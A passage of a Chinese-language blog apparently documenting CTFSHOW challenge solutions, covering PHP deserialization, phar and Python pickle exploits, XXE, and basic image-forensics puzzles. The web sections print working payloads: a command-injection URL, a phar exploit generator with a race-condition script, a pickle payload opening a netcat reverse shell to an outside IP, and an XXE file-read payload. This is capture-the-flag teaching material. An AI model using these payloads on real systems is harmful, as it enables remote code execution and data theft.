</span></span></span><span class=line><span class=cl><span class=cm># @Last Modified time: 2020-12-08 20:08:07
</span></span></span><span class=line><span class=cl><span class=cm># @email: h1xa@ctfer.com
</span></span></span><span class=line><span class=cl><span class=cm># @link: https://ctfer.com
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>filter</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filecontent</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$evilfile</span><span class=o>=</span><span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span><span class=nv>$fn</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=o>=</span><span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filecontent</span><span class=o>=</span><span class=nv>$fn</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>checkevil</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/php|\.\./i&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag/i&#39;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filecontent</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>evilfile</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm &#39;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$f</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>filter</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>],</span><span class=nv>$content</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$f</span><span class=o>-&gt;</span><span class=na>checkevil</span><span class=p>()</span><span class=o>===</span><span class=k>false</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>],</span> <span class=nv>$content</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>copy</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>],</span><span class=nx>md5</span><span class=p>(</span><span class=nx>mt_rand</span><span class=p>())</span><span class=o>.</span><span class=s1>&#39;.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>unlink</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;DOCUMENT_ROOT&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;work done&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;where is flag?&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这题的关键点在于<code>$evilfile</code>为<code>true</code>或者为<code>false</code></p><p>如果为true的话,就会执行</p><pre tabindex=0><code>//可以通过拼接逃逸出来
  if($this-&gt;evilfile){
            system(&#39;rm &#39;.$this-&gt;filename);
        }
</code></pre><p>如果为false的话,就会执行</p><pre tabindex=0><code>  if($f-&gt;checkevil()===false){
  		//写入文件内容
        file_put_contents($_GET[&#39;fn&#39;], $content);
        //复制文件,生成的新文件名进行md5加密+随机数
        copy($_GET[&#39;fn&#39;],md5(mt_rand()).&#39;.txt&#39;);
        //删除原来的文件
        unlink($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;/&#39;.$_GET[&#39;fn&#39;]);
        echo &#39;work done&#39;;
    }
</code></pre><p>很显然只要为 true 就能轻松逃逸并且RCE
<code>?fn=php;tac%20flag.php</code></p><h3 id=web276 class=headerLink><a href=#web276 class=header-mark></a>web276</h3><p>和上一题主要差异在新增 $admin 不可控</p><pre tabindex=0><code>public function __destruct(){
    if($this-&gt;evilfile &amp;&amp; $this-&gt;admin){
        system(&#39;rm &#39;.$this-&gt;filename);
    }
}
</code></pre><p>利用 phar 反序列化 + 条件竞争去做
生成 phar 文件</p><pre tabindex=0><code>&lt;?php  
  
class filter{  
    public $filename;  
    public $filecontent;  
    public $evilfile=true;  
    public $admin = true;  
  
    public function __construct($f=&#39;&#39;,$fn=&#39;&#39;){  
        $this-&gt;filename=&#39;1;tac fla?.ph?&#39;;  
        $this-&gt;filecontent=&#39;&#39;;  
    }  
}  
  
@unlink(&#34;phar.phar&#34;); //删除之前的 phar.phar文件(如果有)  
$phar = new Phar(&#34;phar.phar&#34;);  
$phar -&gt; startBuffering();  
$phar -&gt; setStub(&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;); //设置stub头  
$a = new filter();  //实例化一个filter类  
$phar -&gt; setMetadata($a); //将创建的对象a写入到Metadata中  
$phar -&gt; addFromString(&#34;test.txt&#34;,&#34;test&#34;); //添加要进行压缩的文件，文件名为test，文件内容为testaaa  
$phar -&gt; stopBuffering();
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091733758.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091733758.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091733758.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091733758.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091733758.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091733758.png 2x" sizes=auto alt=image.png></a></figure></p><p>条件竞争</p><pre tabindex=0><code>import requests  
import time  
import threading  
  
success = False  
#读取 phar 包内容  
def getPhar(phar):  
    with open(phar,&#39;rb&#39;) as p:  
        return p.read()  
  
#写入phar包内容  
def writePhar(url, data):  
    print(&#39;writing...&#39;)  
    requests.post(url, data=data)  
  
#触发unlink的Phar反序列化  
def urlinkPhar(url, data):  
    global success  
    print(&#39;unlinking...&#39;)  
    res = requests.post(url, data=data)  
    if &#39;ctfshow&#39; in res.text and success is False:  
        print(res.text)  
        success = True  
  
def main():  
    global success  
    url = &#39;http://3bef0c86-19e9-407f-b2f2-28f3f876655a.challenge.ctf.show/&#39;  
    phar = getPhar(&#39;phar.phar&#39;)  
    while success is False:  
        time.sleep(1)  
        w = threading.Thread(target=writePhar,args=(url+&#39;?fn=p.phar&#39;,phar))  
        u = threading.Thread(target=urlinkPhar,args=(url+&#39;?fn=phar://p.phar/test&#39;,&#39;&#39;))  
        w.start()  
        u.start()  
  
if __name__ == &#39;__main__&#39;:  
    main()
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091651272.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091651272.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091651272.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091651272.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091651272.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091651272.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web277 class=headerLink><a href=#web277 class=header-mark></a>web277</h3><p>源代码有注释<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091901233.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091901233.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091901233.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091901233.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091901233.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412091901233.png 2x" sizes=auto alt=image.png></a></figure>可以看出是 pickle 反序列化，这里直接利用 <code>__reduce__</code> 执行命令，由于无回显，直接反弹shell</p><pre tabindex=0><code>import pickle  
import os  
import base64  
  
  
class CTFshow():  
    def __reduce__(self):  
        return (eval,(&#34;__import__(&#39;os&#39;).popen(&#39;nc 189.1.247.20 6666 -e /bin/sh&#39;).read()&#34;,))  
  
cs = CTFshow()  
csgo = pickle.dumps(cs)  
print(base64.b64encode(csgo))
</code></pre><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092055422.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092055422.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092055422.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092055422.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092055422.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412092055422.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=web278 class=headerLink><a href=#web278 class=header-mark></a>web278</h3><p>过滤了os.system 换成 os.popen
同上</p><h2 id=xxe class=headerLink><a href=#xxe class=header-mark></a>XXE</h2><h3 id=web373 class=headerLink><a href=#web373 class=header-mark></a>web373</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=nx>libxml_disable_entity_loader</span><span class=p>(</span><span class=k>false</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=c1>//允许加载外部实体
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$xmlfile </span><span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>)){</span>    
</span></span><span class=line><span class=cl>	<span class=nv>$dom </span><span class=o>=</span> <span class=k>new</span> <span class=nx>DOMDocument</span><span class=p>();</span>  <span class=c1>//DOMDocument,表示整个HTML或XML文档;作为文档树的根
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//创建一个新的 DOMDocument 对象，用于解析 XML
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nv>$dom</span><span class=o>-&gt;</span><span class=na>loadXML</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>,</span> <span class=nx>LIBXML_NOENT </span><span class=o>|</span> <span class=nx>LIBXML_DTDLOAD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>//loadXML,从一个字符串中，加载一个XML文档，并启用外部实体和DTD加载。LIBXML_NOENT 使解析器替换实体为它们的值，LIBXML_DTDLOAD 使解析器加载外部 DTD。攻击者可以通过在 XML 中定义外部实体来读取服务器上的本地文件或触发其他不安全的操作。
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nv>$creds </span><span class=o>=</span> <span class=nx>simplexml_import_dom</span><span class=p>(</span><span class=nv>$dom</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>//将 DOMDocument 转换为一个SimpleXMLElement对象，方便访问数据节点 
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nv>$ctfshow </span><span class=o>=</span> <span class=nv>$creds</span><span class=o>-&gt;</span><span class=na>ctfshow</span>
</span></span><span class=line><span class=cl>	<span class=c1>//提取 XML 对象中的 &lt;ctfshow&gt; 标签内容
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>echo</span> <span class=nv>$ctfshow</span><span class=p>;</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span></code></pre></div><p>这里我们就可以POST传一个读取服务器的xml，被<code>php://input</code>解析并加载后，通过echo我们就可以看到flag了：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE test [ 
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;</span> 
</span></span><span class=line><span class=cl>]&gt; 
</span></span><span class=line><span class=cl><span class=nt>&lt;sun&gt;</span> 
</span></span><span class=line><span class=cl><span class=nt>&lt;ctfshow&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/ctfshow&gt;</span> 
</span></span><span class=line><span class=cl><span class=nt>&lt;/sun&gt;</span>
</span></span></code></pre></div><h3 id=web374 class=headerLink><a href=#web374 class=header-mark></a>web374</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=nx>libxml_disable_entity_loader</span><span class=p>(</span><span class=k>false</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=nv>$xmlfile </span><span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>)){</span>    
</span></span><span class=line><span class=cl>	<span class=nv>$dom </span><span class=o>=</span> <span class=k>new</span> <span class=nx>DOMDocument</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=nv>$dom</span><span class=o>-&gt;</span><span class=na>loadXML</span><span class=p>(</span><span class=nv>$xmlfile</span><span class=p>,</span> <span class=nx>LIBXML_NOENT </span><span class=o>|</span> <span class=nx>LIBXML_DTDLOAD</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span></code></pre></div><h1 id=misc入门 class=headerLink><a href=#misc%e5%85%a5%e9%97%a8 class=header-mark></a>Misc入门</h1><h2 id=图片篇基础操作 class=headerLink><a href=#%e5%9b%be%e7%89%87%e7%af%87%e5%9f%ba%e7%a1%80%e6%93%8d%e4%bd%9c class=header-mark></a>图片篇(基础操作)</h2><h3 id=misc1 class=headerLink><a href=#misc1 class=header-mark></a>misc1</h3><p>打开就是 flag<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212026034.png title=misc1.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212026034.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212026034.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212026034.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212026034.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212026034.png 2x" sizes=auto alt=misc1.png></a></figure></p><h3 id=misc2 class=headerLink><a href=#misc2 class=header-mark></a>misc2</h3><p>010editor 打开看到PNG头，将后缀改为 PNG 打开为 flag<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212028710.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212028710.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212028710.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212028710.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212028710.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212028710.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=misc3 class=headerLink><a href=#misc3 class=header-mark></a>misc3</h3><p>给的是一个 bpg 后缀的文件，用 bpgview.exe 打开<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212037037.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212037037.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212037037.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212037037.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212037037.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212037037.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=misc4 class=headerLink><a href=#misc4 class=header-mark></a>misc4</h3><p>发现 6个 txt 文件，通过文件头来判断类型</p><pre tabindex=0><code>JPEG (jpg) 文件头：FF D8 FF  文件尾：FF D9

PNG (png)，文件头：89504E47

Windows Bitmap (bmp)， 文件头：424D 文件尾：

GIF (gif)，文件头：47494638

XML (xml)，文件头：3C3F786D6C

HTML (html)，文件头：68746D6C3E

MS Word/Excel (xls.or.doc)，文件头：D0CF11E0

MS Access (mdb)，文件头：5374616E64617264204A

Adobe Acrobat (pdf)，文件头：255044462D312E

Windows Password (pwl)，文件头：E3828596

ZIP Archive (zip)，文件头：504B0304

RAR Archive (rar)，文件头：52617221

Wave (wav)，文件头：57415645

AVI (avi)，文件头：41564920

TIFF (tif)， 文件头：49492A00 文件尾：

WebP (webp)， 文件头：52494646......57454250 (RIFF......WEBP)
</code></pre><p>拼接图片中的 flag<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212052508.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212052508.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212052508.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212052508.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212052508.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212052508.png 2x" sizes=auto alt=image.png></a></figure></p><h2 id=图片篇信息附加 class=headerLink><a href=#%e5%9b%be%e7%89%87%e7%af%87%e4%bf%a1%e6%81%af%e9%99%84%e5%8a%a0 class=header-mark></a>图片篇(信息附加)</h2><h3 id=misc5 class=headerLink><a href=#misc5 class=header-mark></a>misc5</h3><p>打开图片发现是错误 flag ，用010editor 打开发现真实 flag 藏在文件尾部<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212055865.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212055865.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212055865.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212055865.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212055865.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212055865.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=misc6 class=headerLink><a href=#misc6 class=header-mark></a>misc6</h3><p>和上一题类似 flag 藏在文件中<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212057434.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212057434.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212057434.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212057434.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212057434.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212057434.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=misc7 class=headerLink><a href=#misc7 class=header-mark></a>misc7</h3><p>和上一题类似 flag 藏在文件中<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212058727.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212058727.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212058727.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212058727.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212058727.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212058727.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=misc8 class=headerLink><a href=#misc8 class=header-mark></a>misc8</h3><p>foremost 分离出两张图片，另一张为真正的flag图片<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212122474.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212122474.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212122474.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212122474.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212122474.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202411212122474.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=misc9 class=headerLink><a href=#misc9 class=header-mark></a>misc9</h3><p>010editor 查找</p><h3 id=misc10 class=headerLink><a href=#misc10 class=header-mark></a>misc10</h3></div><h2>相关内容</h2><div class=related-container><div class=related-item-container><h2 class=related-title><a href=/posts/wp/buuctf-web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/>BUUCTF WEB做题记录</a></h2></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 13131-1111-1311</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title="CTFSHOW 做题记录" data-hashtags=ctfshow,wp><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-hashtag=ctfshow><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title="CTFSHOW 做题记录" data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title="CTFSHOW 做题记录"><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title="CTFSHOW 做题记录"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title="CTFSHOW 做题记录" data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title="CTFSHOW 做题记录" data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/wp/ctfshow-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title="CTFSHOW 做题记录"><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/ctfshow/>ctfshow</a>,&nbsp;<a href=/tags/wp/>wp</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/python/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87/ class=prev rel=prev title=Python沙盒逃逸绕过><i class="fas fa-angle-left fa-fw"></i>Python沙盒逃逸绕过</a>
<a href=/posts/wp/buuctf-web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ class=next rel=next title="BUUCTF WEB做题记录">BUUCTF WEB做题记录<i class="fas fa-angle-right fa-fw"></i></a></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
